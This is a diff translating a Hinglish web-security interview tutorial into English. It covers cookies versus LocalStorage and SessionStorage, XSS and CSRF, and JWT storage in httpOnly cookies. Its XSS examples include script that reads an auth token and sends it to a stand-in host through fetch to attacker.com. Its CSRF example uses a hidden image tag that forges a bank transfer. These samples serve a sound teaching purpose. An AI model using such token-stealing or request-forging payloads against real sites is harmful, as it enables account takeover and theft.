@@ -1,30 +1,30 @@
 # 🌐 Phase 1: Topic 5 - Web Storage & Security
 
-> **Interview Question:** "Cookies vs LocalStorage vs SessionStorage — kab kya use karein? Security implications kya hain? JWT kahan store karna chahiye?"
+> **Interview Question:** "Cookies vs LocalStorage vs SessionStorage — when to use which? What are the security implications? Where should JWT be stored?"
 
 ---
 
 ## 💡 Beginner-Friendly Explanation (Web Dev Context)
 
-Sabse pehle samajhte hain ki ye teeno **client-side storage** hain — matlab data tumhare **browser** (Chrome, Firefox, Safari) mein store hota hai, server pe nahi.
+First, understand that all three are **client-side storage** — data is stored in your **browser** (Chrome, Firefox, Safari), not on the server.
 
-### 🍪 **Cookies — Server ka Messenger**
-- **Size:** Chhota (4KB tak)
-- **Kaam:** Server ko data bhejna (har request ke saath automatically attach hota hai)
-- **Example:** Login session token — server har request pe check karta hai ki user authenticated hai ya nahi
-- **Web Dev Context:** "Jab tum Amazon pe login karte ho, ek cookie set hoti hai. Agli baar jab tum koi product page kholte ho, browser automatically wo cookie Amazon server ko bhej deta hai, jisse server ko pata chal jata hai ki ye wahi user hai."
+### 🍪 **Cookies — Server's Messenger**
+- **Size:** Small (up to 4KB)
+- **Job:** Send data to server (automatically attached to every request)
+- **Example:** Login session token — server checks on every request whether user is authenticated
+- **Web Dev Context:** "When you log into Amazon, a cookie is set. Next time you open a product page, browser automatically sends that cookie to Amazon server, so server knows it's the same user."
 
-### 📦 **LocalStorage — Browser ka Permanent Storage**
-- **Size:** Bada (5-10MB)
-- **Kaam:** Sirf client-side data store karna (server ko nahi bhejta)
+### 📦 **LocalStorage — Browser's Permanent Storage**
+- **Size:** Large (5-10MB)
+- **Job:** Store only client-side data (doesn't send to server)
 - **Example:** User preferences (dark mode, language), shopping cart for guest users
-- **Web Dev Context:** "Jab tum YouTube pe 'Dark Theme' on karte ho, wo preference LocalStorage mein save ho jati hai. Agli baar jab tum site kholte ho, JavaScript LocalStorage se theme preference padh ke apply kar deti hai — server ko kuch bhejne ki zaroorat nahi."
+- **Web Dev Context:** "When you turn on 'Dark Theme' on YouTube, that preference is saved in LocalStorage. Next time you open the site, JavaScript reads the theme preference from LocalStorage and applies it — no need to send anything to server."
 
-### 🎫 **SessionStorage — Browser ka Temporary Storage**
-- **Size:** Bada (5-10MB, LocalStorage jaisa)
-- **Kaam:** Sirf current browser tab/window tak limited data
+### 🎫 **SessionStorage — Browser's Temporary Storage**
+- **Size:** Large (5-10MB, like LocalStorage)
+- **Job:** Data limited to current browser tab/window only
 - **Example:** Multi-step form data, single-session shopping cart
-- **Web Dev Context:** "Jab tum kisi e-commerce site pe checkout process mein ho (Step 1: Address → Step 2: Payment → Step 3: Confirmation), toh har step ka data SessionStorage mein save kiya ja sakta hai. Agar tum browser band kar dete ho, saara data clear ho jata hai — next visit pe naya session shuru hota hai."
+- **Web Dev Context:** "When you're in a checkout process on an e-commerce site (Step 1: Address → Step 2: Payment → Step 3: Confirmation), data of each step can be saved in SessionStorage. If you close the browser, all data is cleared — next visit starts a fresh session."
 
 ```
 Real-world flow:
@@ -36,6 +36,7 @@ Real-world flow:
 │  SessionStorage: { currentForm: "step2", tempData: {...} }  │
 └─────────────────────────────────────────────────────────────┘
 ```
+
 ---
 
 ## 📊 Technical Comparison — The Complete Breakdown
@@ -53,9 +54,9 @@ Real-world flow:
 
 ---
 
-## 🎯 Kab Kya Use Karein? (Decision Guide)
+## 🎯 When to Use What? (Decision Guide)
 
-### 🍪 **Cookies — Jab Server Ko Data Chahiye**
+### 🍪 **Cookies — When Server Needs Data**
 
 **Use Cases:**
 1. **Authentication/Session Management** (with `httpOnly` flag)
@@ -66,19 +67,19 @@ Real-world flow:
 
 **Example Scenarios:**
 ```
-✅ Sahi Use:
+✅ Right Use:
 - Login session token (httpOnly cookie)
 - "Remember me" checkbox functionality
 - Shopping cart (server needs to know)
-- Language preference (server-side rendering ke liye)
+- Language preference (for server-side rendering)
 
-❌ Galat Use:
-- Large data store (capacity sirf 4KB hai)
+❌ Wrong Use:
+- Store large data (capacity only 4KB)
 - Sensitive data without encryption
-- Data jo sirf client-side chahiye
+- Data only needed client-side
 ```
 
-### 📦 **LocalStorage — Jab Large Data Client-Side Chahiye**
+### 📦 **LocalStorage — When Large Data Needed Client-Side**
 
 **Use Cases:**
 1. **User Preferences** (theme, font size, layout)
@@ -89,20 +90,20 @@ Real-world flow:
 
 **Example Scenarios:**
 ```
-✅ Sahi Use:
+✅ Right Use:
 - Dark mode / Light mode preference
 - Language selection
 - Draft blog post (auto-save)
 - Cached API responses
 - Shopping cart for guest users
 
-❌ Galat Use:
-- Passwords ya sensitive data
+❌ Wrong Use:
+- Passwords or sensitive data
 - Authentication tokens (XSS risk!)
 - Personal/financial information
 ```
 
-### 🎫 **SessionStorage — Jab Temporary, Single-Session Data Chahiye**
+### 🎫 **SessionStorage — When Temporary, Single-Session Data Needed**
 
 **Use Cases:**
 1. **Multi-step Forms** (form data between steps)
@@ -112,14 +113,14 @@ Real-world flow:
 
 **Example Scenarios:**
 ```
-✅ Sahi Use:
+✅ Right Use:
 - Multi-step form data (step 1 → step 2 → step 3)
-- Single-session shopping cart (checkout tak)
+- Single-session shopping cart (until checkout)
 - Temporary filter/sort state
 - Preventing double form submission
 
-❌ Galat Use:
-- Data jo next session mein chahiye
+❌ Wrong Use:
+- Data needed in next session
 - Authentication tokens
 - Persistent user preferences
 ```
@@ -130,107 +131,107 @@ Real-world flow:
 
 ### 🚨 **XSS (Cross-Site Scripting) Attack**
 
-**Kya Hai?**
-- Attacker tumhari website mein **malicious JavaScript** inject kar deta hai
-- Ye JavaScript **LocalStorage/SessionStorage** ko access kar sakti hai
-- Saara data **chori** ho sakta hai
+**What Is It?**
+- Attacker injects **malicious JavaScript** into your website
+- This JavaScript can **access LocalStorage/SessionStorage**
+- All data can be **stolen**
 
 **Attack Example:**
 ```javascript
-// Maano tumhari site pe XSS vulnerability hai
-// Attacker ne ye code inject kiya:
+// Suppose your site has XSS vulnerability
+// Attacker injected this code:
 
 const maliciousScript = `
   const stolenData = localStorage.getItem('auth_token');
   fetch('https://attacker.com/steal?data=' + stolenData);
 `;
 
-// Result: User ka auth token chori ho gaya! 😱
+// Result: User's auth token stolen! 😱
 ```
 
 **LocalStorage/SessionStorage Risk:**
 ```
-❌ LocalStorage mein JWT token:
+❌ JWT token in LocalStorage:
 localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsIn...');
 
-// XSS attack se:
-// 1. Attacker JavaScript run karega
-// 2. localStorage.getItem('token') call karega
-// 3. Token chori ho jayega
-// 4. Attacker tumhari identity use kar sakta hai
+// Via XSS attack:
+// 1. Attacker runs JavaScript
+// 2. Calls localStorage.getItem('token')
+// 3. Token stolen
+// 4. Attacker can use user's identity
 ```
 
 **Prevention:**
 ```javascript
-// ✅ Sahi tarika: httpOnly cookies use karo
+// ✅ Right way: Use httpOnly cookies
 res.cookie('token', jwtToken, {
-  httpOnly: true,  // JavaScript se access nahi hoga
-  secure: true,    // HTTPS pe hi bhejo
-  sameSite: 'strict' // CSRF se bachav
+  httpOnly: true,  // Not accessible via JavaScript
+  secure: true,    // Send only over HTTPS
+  sameSite: 'strict' // CSRF protection
 });
 
-// ❌ Galat tarika:
-localStorage.setItem('token', jwtToken); // XSS se vulnerable
+// ❌ Wrong way:
+localStorage.setItem('token', jwtToken); // Vulnerable to XSS
 ```
 
 ### 🚨 **CSRF (Cross-Site Request Forgery) Attack**
 
-**Kya Hai?**
-- Attacker tumhe **kisi aur site** pe le jata hai
-- Wo site tumhare browser se **automatic requests** bhejti hai
-- **Cookies automatically attach** ho jate hain (browser ka default behavior)
-- Attacker tumhari taraf se **actions** perform kar sakta hai
+**What Is It?**
+- Attacker takes user to **another site**
+- That site sends **automatic requests** from user's browser
+- **Cookies are automatically attached** (browser's default behavior)
+- Attacker can **perform actions** on user's behalf
 
 **Attack Example:**
 ```html
-<!-- Attacker ki website -->
-<img src="https://your-bank.com/transfer?amount=1000&to=attacker" 
+<!-- Attacker's website -->
+<img src="https://your-bank.com/transfer?amount=1000&to=attacker"
      style="display:none">
 
-<!-- Jab tum attacker site pe jaate ho -->
-<!-- Browser automatically cookies bhejta hai -->
-<!-- Bank ko lagta hai tumne transfer kiya! 😱 -->
+<!-- When user visits attacker site -->
+<!-- Browser automatically sends cookies -->
+<!-- Bank thinks user initiated transfer! 😱 -->
 ```
 
 **Why Cookies Are Vulnerable:**
 ```
 Cookies automatically sent with every request:
 ┌─────────────────────────────────────────────────────┐
-│ 1. User logged into bank.com (cookie set hua)       │
+│ 1. User logged into bank.com (cookie set)           │
 │ 2. User visits attacker.com (new tab)               │
-│ 3. Attacker site se request jata hai bank.com ko    │
-│ 4. Browser AUTOMATICALLY cookie attach kar deta hai │
-│ 5. Bank ko lagta hai legitimate user ne request ki  │
-│ 6. Transfer ho jata hai!                            │
+│ 3. Request goes from attacker site to bank.com      │
+│ 4. Browser AUTOMATICALLY attaches cookie           │
+│ 5. Bank thinks legitimate user made request        │
+│ 6. Transfer happens!                                │
 └─────────────────────────────────────────────────────┘
 ```
 
 **Prevention — SameSite Cookie Attribute:**
 ```javascript
-// ✅ SameSite=Strict: Sirf same-site requests mein bhejo
+// ✅ SameSite=Strict: Send only in same-site requests
 res.cookie('session', sessionId, {
-  sameSite: 'strict'  // Cross-site requests mein nahi jayega
+  sameSite: 'strict'  // Won't be sent in cross-site requests
 });
 
-// ✅ SameSite=Lax: Top-level navigation mein bhejo
+// ✅ SameSite=Lax: Send in top-level navigation
 res.cookie('session', sessionId, {
-  sameSite: 'lax'  // Links se aane pe bhejega, forms/images se nahi
+  sameSite: 'lax'  // Sent on link clicks, not forms/images
 });
 
 // ✅ CSRF Token (additional security)
-// Form mein hidden token add karo
+// Add hidden token in form
 <input type="hidden" name="csrf_token" value="abc123">
 ```
 
 **LocalStorage/SessionStorage CSRF Safe:**
 ```
-✅ LocalStorage/SessionStorage CSRF-safe kyun hai?
-- Browser INKO automatically nahi bhejta
-- Manual JavaScript code likhna padega bhejne ke liye
-- Attacker ka script tumhari site pe run nahi kar sakta
-- Isliye CSRF attack nahi hota
+✅ Why LocalStorage/SessionStorage are CSRF-safe?
+- Browser DOESN'T send them automatically
+- Manual JavaScript code needed to send
+- Attacker's script can't run on your site
+- So CSRF attack doesn't happen
 
-BUT: XSS se vulnerable hain! (Dono ka apna risk hai)
+BUT: They're vulnerable to XSS! (Each has its own risk)
 ```
 
 ---
@@ -239,7 +240,7 @@ BUT: XSS se vulnerable hain! (Dono ka apna risk hai)
 
 ### Example 1: Secure Authentication with httpOnly Cookies
 
-**Kya kar rahe hain:** Express server pe **secure authentication** implement kar rahe hain:
+**What we're doing:** Implementing **secure authentication** on Express server:
 
 ```javascript
 const express = require('express');
@@ -250,14 +251,14 @@ const app = express();
 app.use(express.json());
 app.use(cookieParser());
 
-// Middleware: Har request pe token verify karo
+// Middleware: Verify token on every request
 const authenticateToken = (req, res, next) => {
-  const token = req.cookies.token; // httpOnly cookie se read
-  
+  const token = req.cookies.token; // Read from httpOnly cookie
+
   if (!token) {
     return res.status(401).json({ error: 'Access denied' });
   }
-  
+
   try {
     const verified = jwt.verify(token, process.env.JWT_SECRET);
     req.user = verified;
@@ -270,46 +271,46 @@ const authenticateToken = (req, res, next) => {
 // Login endpoint
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
-  
-  // Database se user verify karo (simplified)
+
+  // Verify user from database (simplified)
   const user = { id: 1, username: 'john' }; // Assume verified
-  
-  // JWT token generate karo
+
+  // Generate JWT token
   const token = jwt.sign(
     { userId: user.id, username: user.username },
     process.env.JWT_SECRET,
     { expiresIn: '1h' }
   );
-  
-  // ✅ SECURE: httpOnly cookie mein token store karo
+
+  // ✅ SECURE: Store token in httpOnly cookie
   res.cookie('token', token, {
-    httpOnly: true,      // ❌ JavaScript se access nahi hoga (XSS safe)
-    secure: true,        // ✅ Sirf HTTPS pe bhejo (production mein)
+    httpOnly: true,      // ❌ Not accessible via JavaScript (XSS safe)
+    secure: true,        // ✅ Send only over HTTPS (production)
     sameSite: 'strict',  // ✅ CSRF protection
     maxAge: 3600000      // 1 hour
   });
-  
+
   res.json({ message: 'Logged in successfully', user });
 });
 
 // Protected route
 app.get('/api/profile', authenticateToken, (req, res) => {
-  res.json({ 
-    message: 'Protected data', 
-    user: req.user 
+  res.json({
+    message: 'Protected data',
+    user: req.user
   });
 });
 
 // Logout endpoint
 app.post('/logout', (req, res) => {
-  // Cookie ko expire kar do
+  // Expire the cookie
   res.cookie('token', '', {
     httpOnly: true,
     secure: true,
     sameSite: 'strict',
     expires: new Date(0) // Past date = expire
   });
-  
+
   res.json({ message: 'Logged out successfully' });
 });
 
@@ -317,16 +318,16 @@ app.listen(3000);
 ```
 
 **Key Security Points:**
-- `httpOnly: true` — JavaScript (`document.cookie`) se access nahi hoga → **XSS safe**
-- `secure: true` — Sirf HTTPS connections pe bhejega → **Man-in-the-middle safe**
-- `sameSite: 'strict'` — Cross-site requests mein nahi jayega → **CSRF safe**
-- `maxAge: 3600000` — 1 hour baad automatically expire
+- `httpOnly: true` — Not accessible via JavaScript (`document.cookie`) → **XSS safe**
+- `secure: true` — Sent only over HTTPS connections → **Man-in-the-middle safe**
+- `sameSite: 'strict'` — Not sent in cross-site requests → **CSRF safe**
+- `maxAge: 3600000` — Auto-expires after 1 hour
 
 ---
 
 ### Example 2: LocalStorage for User Preferences
 
-**Kya kar rahe hain:** User preferences (theme, language) ko **LocalStorage** mein save kar rahe hain:
+**What we're doing:** Saving user preferences (theme, language) in **LocalStorage**:
 
 ```javascript
 // Theme Manager Class
@@ -335,8 +336,8 @@ class ThemeManager {
     this.THEME_KEY = 'user_theme_preference';
     this.LANGUAGE_KEY = 'user_language_preference';
   }
-  
-  // Theme set karna
+
+  // Set theme
   setTheme(theme) {
     try {
       localStorage.setItem(this.THEME_KEY, theme);
@@ -345,8 +346,8 @@ class ThemeManager {
       console.error('LocalStorage not available:', error);
     }
   }
-  
-  // Theme get karna
+
+  // Get theme
   getTheme() {
     try {
       return localStorage.getItem(this.THEME_KEY) || 'light';
@@ -355,12 +356,12 @@ class ThemeManager {
       return 'light';
     }
   }
-  
-  // Theme apply karna
+
+  // Apply theme
   applyTheme(theme) {
     document.documentElement.setAttribute('data-theme', theme);
-    
-    // CSS variables update karo
+
+    // Update CSS variables
     if (theme === 'dark') {
       document.body.style.backgroundColor = '#1a1a2e';
       document.body.style.color = '#eaeaea';
@@ -369,8 +370,8 @@ class ThemeManager {
       document.body.style.color = '#333333';
     }
   }
-  
-  // Language set karna
+
+  // Set language
   setLanguage(lang) {
     try {
       localStorage.setItem(this.LANGUAGE_KEY, lang);
@@ -378,8 +379,8 @@ class ThemeManager {
       console.error('Error saving language:', error);
     }
   }
-  
-  // Language get karna
+
+  // Get language
   getLanguage() {
     try {
       return localStorage.getItem(this.LANGUAGE_KEY) || 'en';
@@ -406,16 +407,16 @@ document.getElementById('theme-toggle').addEventListener('click', () => {
 });
 ```
 
-**Why LocalStorage is Safe Here:**
-- Theme preference **non-sensitive data** hai
-- XSS attack se bhi koi major loss nahi hoga
-- User experience improve hoti hai (persistent preference)
+**Why LocalStorage Is Safe Here:**
+- Theme preference is **non-sensitive data**
+- Even if XSS attack happens, no major loss
+- Improves user experience (persistent preference)
 
 ---
 
 ### Example 3: SessionStorage for Multi-Step Form
 
-**Kya kar rahe hain:** Multi-step registration form ka data **SessionStorage** mein save kar rahe hain:
+**What we're doing:** Saving multi-step registration form data in **SessionStorage**:
 
 ```javascript
 class MultiStepForm {
@@ -423,30 +424,30 @@ class MultiStepForm {
     this.STORAGE_KEY = 'registration_form_data';
     this.currentStep = 1;
     this.totalSteps = 3;
-    
-    // Existing data load karo (agar browser refresh hua ho)
+
+    // Load existing data (in case browser refreshed)
     this.loadData();
   }
-  
-  // Form data save karna
+
+  // Save form data
   saveStepData(stepNumber, data) {
     try {
-      // Existing data load karo
+      // Load existing data
       const existingData = this.loadData() || {};
-      
-      // Naya data merge karo
+
+      // Merge new data
       existingData[`step${stepNumber}`] = data;
       existingData.currentStep = stepNumber;
-      
-      // SessionStorage mein save karo
+
+      // Save in SessionStorage
       sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify(existingData));
-      
+
     } catch (error) {
       console.error('Error saving form data:', error);
     }
   }
-  
-  // Form data load karna
+
+  // Load form data
   loadData() {
     try {
       const data = sessionStorage.getItem(this.STORAGE_KEY);
@@ -456,42 +457,42 @@ class MultiStepForm {
       return null;
     }
   }
-  
-  // Next step pe jana
+
+  // Go to next step
   nextStep() {
     if (this.currentStep < this.totalSteps) {
       this.currentStep++;
       this.renderStep(this.currentStep);
     }
   }
-  
-  // Previous step pe jana
+
+  // Go to previous step
   prevStep() {
     if (this.currentStep > 1) {
       this.currentStep--;
       this.renderStep(this.currentStep);
     }
   }
-  
-  // Form submit karna
+
+  // Submit form
   async submitForm() {
     const completeData = this.loadData();
-    
+
     if (!completeData) {
       alert('No form data found');
       return;
     }
-    
+
     try {
-      // Server ko bhejo
+      // Send to server
       const response = await fetch('/api/register', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(completeData)
       });
-      
+
       if (response.ok) {
-        // Success! SessionStorage clear karo
+        // Success! Clear SessionStorage
         sessionStorage.removeItem(this.STORAGE_KEY);
         alert('Registration successful!');
         window.location.href = '/dashboard';
@@ -500,17 +501,17 @@ class MultiStepForm {
       console.error('Submission error:', error);
     }
   }
-  
-  // Step render karna
+
+  // Render step
   renderStep(stepNumber) {
     const data = this.loadData();
     const stepData = data ? data[`step${stepNumber}`] : {};
-    
-    // Form fields populate karo
+
+    // Populate form fields
     // ... implementation
   }
-  
-  // Browser close/refresh pe data bachana
+
+  // Save data before browser close/refresh
   handleBeforeUnload(event) {
     if (this.currentStep < this.totalSteps) {
       event.preventDefault();
@@ -533,84 +534,84 @@ document.getElementById('step1-form').addEventListener('submit', (e) => {
   form.nextStep();
 });
 
-// Browser close pe warning
+// Warning on browser close
 window.addEventListener('beforeunload', (e) => form.handleBeforeUnload(e));
 ```
 
-**Why SessionStorage is Perfect Here:**
-- Data **temporary** hai (registration ke baad delete)
-- **Tab-specific** (multiple tabs mein conflict nahi)
-- Browser close karne pe **auto cleanup**
+**Why SessionStorage Is Perfect Here:**
+- Data is **temporary** (deleted after registration)
+- **Tab-specific** (no conflict between multiple tabs)
+- **Auto cleanup** on browser close
 - **No server communication** needed
 
 ---
 
 ### Example 4: XSS Attack Demonstration & Prevention
 
-**Kya kar rahe hain:** XSS vulnerability demonstrate kar rahe hain aur uska **prevention** dikha rahe hain:
+**What we're doing:** Demonstrating XSS vulnerability and its **prevention**:
 
 ```javascript
 // ❌ VULNERABLE CODE (Don't do this!)
 class VulnerableApp {
   constructor() {
-    // JWT token LocalStorage mein store kiya (BAD!)
+    // JWT token stored in LocalStorage (BAD!)
     this.storeToken('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
   }
-  
+
   storeToken(token) {
     localStorage.setItem('auth_token', token);
   }
-  
+
   getToken() {
     return localStorage.getItem('auth_token');
   }
-  
-  // User input directly display karna (XSS vulnerability!)
+
+  // Displaying user input directly (XSS vulnerability!)
   displayUserProfile(username) {
-    // ❌ GALAT: User input directly HTML mein
+    // ❌ WRONG: User input directly in HTML
     document.getElementById('username').innerHTML = username;
   }
 }
 
 // Attack scenario:
-// 1. Attacker comment mein ye script daal deta hai:
+// 1. Attacker puts this script in a comment:
 const maliciousUsername = '<script>stealToken()</script>';
 
-// 2. Jab ye render hoga:
+// 2. When rendered:
 vulnerableApp.displayUserProfile(maliciousUsername);
-// Browser script execute karega!
+// Browser executes the script!
 
-// 3. Attacker ka script:
+// 3. Attacker's script:
 function stealToken() {
   const token = localStorage.getItem('auth_token');
   fetch('https://attacker.com/steal?token=' + token);
 }
 
-// Result: Token chori ho gaya! 😱
+// Result: Token stolen! 😱
 
 // ✅ SECURE CODE (Do this instead!)
 class SecureApp {
   constructor() {
-    // Token httpOnly cookie mein store karo
-    // (Server-side set karna chahiye, client-side nahi)
+    // Token stored in httpOnly cookie
+    // (Should be set server-side, not client-side)
   }
-  
-  // User input sanitize karna
+
+  // Sanitize user input
   sanitizeInput(input) {
     const div = document.createElement('div');
     div.textContent = input; // Automatically escapes HTML
     return div.innerHTML;
   }
-  
+
   // Safe display
   displayUserProfile(username) {
-    // ✅ SAHI: Sanitized output use karo
+    // ✅ RIGHT: Use sanitized output
     document.getElementById('username').textContent = username;
     // OR
     document.getElementById('username').innerHTML = this.sanitizeInput(username);
   }
-  
-  // Content Security Policy (CSP) headers set karo
+
+  // Content Security Policy (CSP) headers set
   // Server-side:
   // res.setHeader('Content-Security-Policy', "default-src 'self'");
 }
@@ -626,15 +627,15 @@ app.use(helmet()); // Automatic security headers
 app.use((req, res, next) => {
   // XSS protection
   res.setHeader('X-XSS-Protection', '1; mode=block');
-  
+
   // Content Security Policy
-  res.setHeader('Content-Security-Policy', 
+  res.setHeader('Content-Security-Policy',
     "default-src 'self'; script-src 'self'; style-src 'self'"
   );
-  
+
   // Prevent MIME type sniffing
   res.setHeader('X-Content-Type-Options', 'nosniff');
-  
+
   next();
 });
 ```
@@ -643,7 +644,7 @@ app.use((req, res, next) => {
 
 ### Example 5: Complete Auth Flow with Secure Cookies
 
-**Kya kar rahe hain:** Ek complete **authentication system** bana rahe hain:
+**What we're doing:** Building a complete **authentication system**:
 
 ```javascript
 // Backend (Node.js/Express)
@@ -664,49 +665,49 @@ const users = [
 // Register endpoint
 app.post('/register', async (req, res) => {
   const { username, password } = req.body;
-  
-  // Password hash karo
+
+  // Hash password
   const hashedPassword = await bcrypt.hash(password, 10);
-  
-  // User save karo (database mein)
+
+  // Save user (in database)
   const newUser = { id: Date.now(), username, password: hashedPassword };
   users.push(newUser);
-  
+
   res.status(201).json({ message: 'User registered successfully' });
 });
 
 // Login endpoint
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
-  
-  // User find karo
+
+  // Find user
   const user = users.find(u => u.username === username);
   if (!user) {
     return res.status(401).json({ error: 'Invalid credentials' });
   }
-  
-  // Password verify karo
+
+  // Verify password
   const validPassword = await bcrypt.compare(password, user.password);
   if (!validPassword) {
     return res.status(401).json({ error: 'Invalid credentials' });
   }
-  
-  // JWT token generate karo
+
+  // Generate JWT token
   const token = jwt.sign(
     { userId: user.id, username: user.username },
     process.env.JWT_SECRET,
     { expiresIn: '1h' }
   );
-  
-  // ✅ SECURE: httpOnly cookie set karo
+
+  // ✅ SECURE: Set httpOnly cookie
   res.cookie('auth_token', token, {
-    httpOnly: true,      // JavaScript se access nahi
+    httpOnly: true,      // Not accessible via JavaScript
     secure: true,        // HTTPS only (production)
     sameSite: 'strict',  // CSRF protection
     maxAge: 3600000      // 1 hour
   });
-  
-  res.json({ 
+
+  res.json({
     message: 'Logged in successfully',
     user: { id: user.id, username: user.username }
   });
@@ -715,11 +716,11 @@ app.post('/login', async (req, res) => {
 // Protected route middleware
 const protectRoute = (req, res, next) => {
   const token = req.cookies.auth_token;
-  
+
   if (!token) {
     return res.status(401).json({ error: 'Not authenticated' });
   }
-  
+
   try {
     const decoded = jwt.verify(token, process.env.JWT_SECRET);
     req.user = decoded;
@@ -745,14 +746,14 @@ app.post('/logout', (req, res) => {
     sameSite: 'strict',
     expires: new Date(0) // Expire immediately
   });
-  
+
   res.json({ message: 'Logged out successfully' });
 });
 
 // Frontend (React example)
 function App() {
   const [user, setUser] = useState(null);
-  
+
   // Login function
   const login = async (username, password) => {
     try {
@@ -760,9 +761,9 @@ function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username, password }),
-        credentials: 'include' // Cookies include karo
+        credentials: 'include' // Include cookies
       });
-      
+
       if (response.ok) {
         const data = await response.json();
         setUser(data.user);
@@ -771,14 +772,14 @@ function App() {
       console.error('Login error:', error);
     }
   };
-  
-  // Get profile (cookie automatically bhejega)
+
+  // Get profile (cookie sent automatically)
   const getProfile = async () => {
     try {
       const response = await fetch('/api/profile', {
-        credentials: 'include' // Cookies include
+        credentials: 'include' // Include cookies
       });
-      
+
       if (response.ok) {
         const data = await response.json();
         console.log('Profile:', data);
@@ -787,7 +788,7 @@ function App() {
       console.error('Error:', error);
     }
   };
-  
+
   // Logout
   const logout = async () => {
     await fetch('/logout', {
@@ -796,7 +797,7 @@ function App() {
     });
     setUser(null);
   };
-  
+
   return (
     <div>
       <button onClick={() => login('john', 'password123')}>Login</button>
@@ -813,7 +814,7 @@ function App() {
 
 ### Problem 1: JWT in LocalStorage (❌ Most Common Mistake)
 
-**Scenario:** Developers JWT token LocalStorage mein store kar dete hain for "convenience".
+**Scenario:** Developers store JWT token in LocalStorage for "convenience".
 
 **Why It's Wrong:**
 ```javascript
@@ -821,15 +822,15 @@ function App() {
 localStorage.setItem('token', jwtToken);
 
 // Attack:
-// 1. XSS vulnerability exploit hoti hai
-// 2. Attacker localStorage.getItem('token') call karta hai
-// 3. Token chori ho jata hai
-// 4. Attacker user ban ke actions perform kar sakta hai
+// 1. XSS vulnerability exploited
+// 2. Attacker calls localStorage.getItem('token')
+// 3. Token stolen
+// 4. Attacker can perform actions as user
 ```
 
 **Solution:**
 ```javascript
-// ✅ RIGHT - httpOnly cookies use karo
+// ✅ RIGHT - Use httpOnly cookies
 res.cookie('token', jwtToken, {
   httpOnly: true,      // XSS safe
   secure: true,        // HTTPS only
@@ -839,7 +840,7 @@ res.cookie('token', jwtToken, {
 
 ### Problem 2: Forgetting `Secure` Flag in Production
 
-**Scenario:** Development mein `secure: false` kaam karta hai, production mein fail.
+**Scenario:** `secure: false` works in development, fails in production.
 
 **Solution:**
 ```javascript
@@ -856,7 +857,7 @@ res.cookie('token', jwtToken, {
 
 ### Problem 3: Not Setting `SameSite` Attribute
 
-**Scenario:** CSRF attacks ho rahe hain because cookies cross-site bhej rahe hain.
+**Scenario:** CSRF attacks happening because cookies sent cross-site.
 
 **Solution:**
 ```javascript
@@ -869,14 +870,14 @@ res.cookie('token', jwtToken, {
 });
 
 // SameSite options:
-// - 'strict': Sirf same-site requests mein
-// - 'lax': Top-level navigation mein bhejega
-// - 'none': Cross-site bhejega (secure: true zaroori hai)
+// - 'strict': Only in same-site requests
+// - 'lax': Sent in top-level navigation
+// - 'none': Sent cross-site (secure: true required)
 ```
 
 ### Problem 4: Storing Sensitive Data in Any Client Storage
 
-**Scenario:** Developers passwords, credit card numbers client-side store kar dete hain.
+**Scenario:** Developers store passwords, credit card numbers client-side.
 
 **Solution:**
 ```javascript
@@ -884,14 +885,14 @@ res.cookie('token', jwtToken, {
 localStorage.setItem('password', password); // BIG NO!
 sessionStorage.setItem('creditCard', cardNumber); // NO!
 
-// ✅ Server-side hi store karo
-// Database mein securely store karo
-// Client-side sirf non-sensitive data rakho
+// ✅ Store server-side only
+// Securely store in database
+// Keep only non-sensitive data on client
 ```
 
 ### Problem 5: Not Handling Storage Quota Exceeded
 
-**Scenario:** LocalStorage full ho jata hai, app crash ho jata hai.
+**Scenario:** LocalStorage gets full, app crashes.
 
 **Solution:**
 ```javascript
@@ -901,7 +902,7 @@ function safeSetStorage(key, value) {
   } catch (error) {
     if (error.name === 'QuotaExceededError') {
       console.warn('LocalStorage quota exceeded');
-      // Fallback: Older data clear karo ya server pe bhejo
+      // Fallback: Clear old data or send to server
       clearOldData();
     }
   }
@@ -909,7 +910,7 @@ function safeSetStorage(key, value) {
 
 function clearOldData() {
   // Implement LRU (Least Recently Used) cleanup
-  // Ya important data server pe sync karo
+  // Or sync important data to server
 }
 ```
 
@@ -921,10 +922,10 @@ function clearOldData() {
 
 | Flag | Purpose | Example |
 |------|---------|---------|
-| `httpOnly` | JavaScript se access block | `Set-Cookie: token=abc; httpOnly` |
+| `httpOnly` | Block JavaScript access | `Set-Cookie: token=abc; httpOnly` |
 | `Secure` | HTTPS-only transmission | `Set-Cookie: token=abc; Secure` |
-| `SameSite=Strict` | Cross-site requests block | `Set-Cookie: token=abc; SameSite=Strict` |
-| `SameSite=Lax` | Top-level navigation allow | `Set-Cookie: token=abc; SameSite=Lax` |
+| `SameSite=Strict` | Block cross-site requests | `Set-Cookie: token=abc; SameSite=Strict` |
+| `SameSite=Lax` | Allow top-level navigation | `Set-Cookie: token=abc; SameSite=Lax` |
 | `Max-Age` | Expiration in seconds | `Set-Cookie: token=abc; Max-Age=3600` |
 | `Expires` | Expiration date | `Set-Cookie: token=abc; Expires=Wed, 01 Jan 2025 13:00:00 GMT` |
 | `Path` | Cookie scope | `Set-Cookie: token=abc; Path=/admin` |
@@ -934,7 +935,7 @@ function clearOldData() {
 
 ```javascript
 // Server-side CSP headers
-res.setHeader('Content-Security-Policy', 
+res.setHeader('Content-Security-Policy',
   "default-src 'self'; " +           // Default: same origin
   "script-src 'self'; " +            // Scripts: same origin only
   "style-src 'self' 'unsafe-inline'; " + // Styles: inline allowed
@@ -962,41 +963,41 @@ res.setHeader('Content-Security-Policy',
 
 ## 🎙️ Interview Articulation (How to Answer)
 
-### Q: "JWT ko LocalStorage mein store karna safe hai?"
+### Q: "Is storing JWT in LocalStorage safe?"
 
-**Answer:** "Sir, JWT ko LocalStorage mein store karna **secure nahi hai** kyunki LocalStorage JavaScript se accessible hota hai. Agar website mein XSS (Cross-Site Scripting) vulnerability hai, toh attacker JavaScript ke through token chori kar sakta hai. **Best practice** ye hai ki JWT ko **httpOnly cookies** mein store karein, jo JavaScript se accessible nahi hoti. Saath hi `Secure` flag (HTTPS-only) aur `SameSite=Strict` (CSRF protection) zaroor set karein."
